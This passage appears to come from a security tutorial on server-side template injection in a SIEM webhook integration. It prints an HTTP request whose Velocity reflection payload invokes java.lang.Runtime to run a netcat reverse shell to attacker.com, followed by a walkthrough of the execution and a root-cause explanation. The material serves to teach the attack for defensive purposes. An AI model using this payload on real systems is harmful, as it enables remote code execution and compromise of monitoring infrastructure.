// 2. Attacker injects a Java/Velocity reflection payload directly into the JSON configuration body.

POST /api/v1/integrations/webhooks HTTP/1.1
Host: siem.enterprise.tld
Authorization: Bearer <user_token>
Content-Type: application/json

{
  "integrationName": "Slack Alerting",
  "destinationUrl": "https://hooks.slack.com/services/T0000/B000/XXXX",
  "customPayloadTemplate": "{\"text\": \"#set($engine=\\\"\\\")#set($exec=$engine.getClass().forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\",null).invoke(null,null))${exec.exec(\\\"nc -e /bin/sh attacker.com 4444\\\")} Alert triggered!\"}"
}

// 3. The API validates the object and saves the configuration securely.
// 4. The Attacker clicks "Send Test Alert" in the UI.
// 5. The Alert Dispatcher microservice pulls the customPayloadTemplate string.
// 6. The Dispatcher passes the string into Velocity.evaluate() to bind the variables.
// 7. Velocity executes the reflection payload. It locates the java.lang.Runtime class, 
//    invokes getRuntime(), and executes the netcat reverse shell.

// 8. The attacker receives a reverse shell from the central SIEM dispatcher, 
//    gaining the ability to monitor or modify all telemetry data flowing through the enterprise.
```
{% endstep %}

{% step %}
To support complex third-party integration schemas without incurring devastating serialization bottlenecks, architects repurposed robust templating engines as high-speed JSON payload synthesizers. The developers operated under the flawed assumption that restricting the data variables passed to the template equated to sandboxing the execution environment. They failed to explicitly disable the native reflection and class-loading capabilities of the underlying templating framework. The attacker exploited this oversight by embedding language-specific reflection logic directly into the webhook configuration text. When the dispatcher compiled the text to synthesize the final outbound alert, the templating engine evaluated the injected payload, instantiated the host language's system execution class, and launched a reverse shell. The attack compromised the most central, highly-connected node in the observability architecture, providing unparalleled lateral movement opportunities
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
